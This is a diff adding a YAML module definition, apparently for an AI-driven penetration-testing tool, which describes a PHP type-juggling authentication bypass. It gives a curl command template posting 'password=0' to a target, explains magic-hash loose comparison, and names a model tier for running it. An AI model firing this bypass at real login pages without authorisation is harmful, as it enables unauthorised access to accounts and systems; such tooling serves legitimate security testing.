@@ -1,0 +1,16 @@
+name: type_juggling
+category: web
+description: PHP type juggling bypass
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "curl -s '{target_url}' -d 'password=0'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "PHP loose comparison (==) treats '0e123' as 0 (scientific notation). Magic hashes: MD5('240610708')='0e462097...'. Also: null == false == 0 == '' in PHP."
